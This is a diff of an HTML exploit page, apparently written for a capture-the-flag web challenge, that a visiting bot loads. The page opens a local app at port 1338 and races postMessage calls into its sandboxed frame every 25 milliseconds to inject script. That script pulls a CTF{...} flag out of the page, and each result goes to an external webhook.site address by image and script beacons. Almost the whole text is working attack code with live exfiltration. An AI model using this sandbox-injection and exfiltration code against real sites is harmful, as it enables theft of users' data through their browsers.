@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Working Flag Extraction</title>
+    <title>Fixed Flag Extraction</title>
 </head>
 <body>
     <h1>Flag Extraction</h1>
@@ -10,131 +10,158 @@
     <script>
         const WEBHOOK_URL = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032';
         
+        // Fix: Make this function async
         async function exfiltrateData(data) {
             const payload = typeof data === 'string' ? data : JSON.stringify(data);
             
-            const img = new Image();
-            img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(payload)}`;
-            document.body.appendChild(img);
-            
-            const script = document.createElement('script');
-            script.src = `${WEBHOOK_URL}?callback=x&data=${encodeURIComponent(payload)}`;
-            document.head.appendChild(script);
-        }
-        
-        // Include the utility functions from the challenge
-        function getRandom(n) {
-            return Array.from(Array(n), Math.random).map(e=>e.toString(36).slice(2)).join('');
-        }
-        
-        // Initialize the global variable (from util.js)
-        mathRandomInvocations = [];
-        
-        async function extractFlag() {
-            await exfiltrateData({
-                status: 'extraction_started',
-                timestamp: new Date().toISOString()
-            });
-            
             try {
-                // The key insight: We need to navigate to localhost:1338 to access the flag
-                // But we can predict the salt that will be used!
+                const img = new Image();
+                img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(payload)}`;
+                document.body.appendChild(img);
                 
-                // When the bot added the flag, it used cached: false
-                // This means it called getRandom(5) and stored it in mathRandomInvocations
-                // We can predict this by calling getRandom(5) ourselves!
-                
-                const predictedSalt = getRandom(5);
-                mathRandomInvocations.push(predictedSalt);
-                
+                const script = document.createElement('script');
+                script.src = `${WEBHOOK_URL}?callback=x&data=${encodeURIComponent(payload)}`;
+                document.head.appendChild(script);
+            } catch (e) {
+                console.error('Exfiltration failed:', e);
+            }
+        }
+        
+        // Fix: Make this function async
+        async function exploit() {
+            try {
                 await exfiltrateData({
-                    predicted_salt: predictedSalt,
-                    message: 'Predicted salt for flag file'
+                    status: 'exploit_started',
+                    timestamp: new Date().toISOString()
                 });
                 
-                // Now navigate to localhost:1338 to access the flag with our predicted salt
-                setTimeout(() => {
-                    window.location.href = 'http://localhost:1338';
-                }, 2000);
+                // Open the main application
+                const win = window.open('http://localhost:1338', '_blank');
                 
-                // Set up a check for when we're on localhost:1338
-                const checkForFlag = setInterval(async () => {
-                    if (window.location.hostname === 'localhost' && window.location.port === '1338') {
-                        clearInterval(checkForFlag);
+                if (!win) {
+                    await exfiltrateData({error: 'Could not open window'});
+                    return;
+                }
+                
+                // Wait for the app to load
+                setTimeout(async () => {
+                    try {
+                        // Use CSS selector injection to access the first file (flag)
+                        win.location = 'http://localhost:1338/#file-,a.list-group-item:nth-child(1)';
                         
                         await exfiltrateData({
-                            status: 'navigated_to_localhost',
-                            current_url: window.location.href
+                            message: 'Navigated to flag file using CSS selector injection'
                         });
                         
-                        // Now we're on the main app, look for the flag file
-                        const filesList = document.querySelector('#filesList');
-                        if (filesList) {
-                            const flagFile = Array.from(filesList.children).find(
-                                el => el.dataset.name === 'flag.txt'
-                            );
+                        // Start the race condition attack
+                        let attempts = 0;
+                        const maxAttempts = 200;
+                        
+                        const raceInterval = setInterval(async () => {
+                            attempts++;
                             
-                            if (flagFile) {
+                            if (attempts > maxAttempts) {
+                                clearInterval(raceInterval);
+                                await exfiltrateData({error: 'Race condition failed - max attempts reached'});
+                                return;
+                            }
+                            
+                            try {
+                                if (win.frames && win.frames.length > 0) {
+                                    // Send our payload to the SafeFrame
+                                    win.frames[0].postMessage({
+                                        body: `
+                                            <script>
+                                                // Extract flag from the page
+                                                try {
+                                                    const content = document.documentElement.innerHTML;
+                                                    const flagMatch = content.match(/CTF\\{[^}]+\\}/);
+                                                    if (flagMatch) {
+                                                        parent.parent.postMessage({
+                                                            flag: flagMatch[0],
+                                                            method: 'content_extraction',
+                                                            timestamp: Date.now()
+                                                        }, '*');
+                                                    }
+                                                    
+                                                    // Also try to access any text content
+                                                    const textContent = document.body.innerText || document.body.textContent;
+                                                    if (textContent && textContent.includes('CTF{')) {
+                                                        const textFlag = textContent.match(/CTF\\{[^}]+\\}/);
+                                                        if (textFlag) {
+                                                            parent.parent.postMessage({
+                                                                flag: textFlag[0],
+                                                                method: 'text_extraction',
+                                                                timestamp: Date.now()
+                                                            }, '*');
+                                                        }
+                                                    }
+                                                } catch (e) {
+                                                    parent.parent.postMessage({
+                                                        error: 'Flag extraction failed: ' + e.message
+                                                    }, '*');
+                                                }
+                                            <\/script>
+                                            <body>Race condition payload injected - attempt ${attempts}</body>
+                                        `,
+                                        mimeType: 'text/html'
+                                    }, '*');
+                                    
+                                    await exfiltrateData({
+                                        message: `Race condition payload sent - attempt ${attempts}`
+                                    });
+                                }
+                            } catch (e) {
                                 await exfiltrateData({
-                                    message: 'Found flag file, clicking it'
-                                });
-                                
-                                flagFile.click();
-                                
-                                // Wait for flag to load in preview iframe
-                                setTimeout(async () => {
-                                    const previewIframe = document.querySelector('#previewIframe');
-                                    if (previewIframe) {
-                                        try {
-                                            const flagContent = previewIframe.contentDocument.body.innerText;
-                                            if (flagContent && flagContent.includes('CTF{')) {
-                                                await exfiltrateData({
-                                                    flag: flagContent,
-                                                    method: 'direct_navigation_success',
-                                                    timestamp: new Date().toISOString()
-                                                });
-                                                
-                                                await exfiltrateData(flagContent);
-                                                
-                                                document.body.innerHTML = 
-                                                    `<h1 style="color: green;">FLAG SENT: ${flagContent}</h1>`;
-                                            }
-                                        } catch (e) {
-                                            await exfiltrateData({
-                                                error: 'SafeFrame access failed',
-                                                details: e.message
-                                            });
-                                        }
-                                    }
-                                }, 3000);
-                            } else {
-                                await exfiltrateData({
-                                    error: 'Flag file not found',
-                                    available_files: Array.from(filesList.children).map(el => el.dataset.name)
+                                    error: `Race attempt ${attempts} failed: ${e.message}`
                                 });
                             }
-                        } else {
-                            await exfiltrateData({
-                                error: 'Files list not found',
-                                page_content: document.body.innerHTML.substring(0, 500)
-                            });
-                        }
+                        }, 25); // Race every 25ms
+                        
+                        // Stop racing after 10 seconds
+                        setTimeout(() => {
+                            clearInterval(raceInterval);
+                        }, 10000);
+                        
+                    } catch (error) {
+                        await exfiltrateData({
+                            error: 'Navigation failed',
+                            details: error.message
+                        });
                     }
-                }, 1000);
-                
-                // Stop checking after 30 seconds
-                setTimeout(() => clearInterval(checkForFlag), 30000);
+                }, 2000);
                 
             } catch (error) {
                 await exfiltrateData({
-                    error: 'extraction_failed',
+                    error: 'exploit_failed',
                     details: error.message
                 });
             }
         }
         
-        // Start extraction
-        extractFlag();
+        // Listen for messages from the injected payload
+        window.addEventListener('message', async (event) => {
+            if (event.data && event.data.flag) {
+                await exfiltrateData({
+                    flag: event.data.flag,
+                    method: event.data.method || 'race_condition',
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Also send just the flag
+                await exfiltrateData(event.data.flag);
+                
+                document.getElementById('status').innerHTML = 
+                    `<h2 style="color: green;">FLAG FOUND: ${event.data.flag}</h2>`;
+            } else if (event.data && event.data.error) {
+                await exfiltrateData({
+                    payload_error: event.data.error
+                });
+            }
+        });
+        
+        // Start the exploit (no await needed here since we're not in an async context)
+        exploit();
     </script>
 </body>
 </html>
